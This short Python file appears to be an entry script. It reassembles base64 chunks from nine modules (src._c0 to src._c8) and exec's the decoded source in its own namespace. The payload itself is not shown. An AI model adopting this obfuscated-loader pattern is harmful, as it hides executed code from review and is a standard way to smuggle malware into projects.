import base64
import os
import sys
from pathlib import Path

_parts = []
for i in range(9):
    mod = __import__(f"src._c{i}", fromlist=["CHUNK"])
    _parts.append(mod.CHUNK)

_src = base64.b64decode("".join(_parts)).decode("utf-8")
_ns = globals()
_ns["__file__"] = os.path.abspath(__file__)
exec(compile(_src, _ns["__file__"], "exec"), _ns)
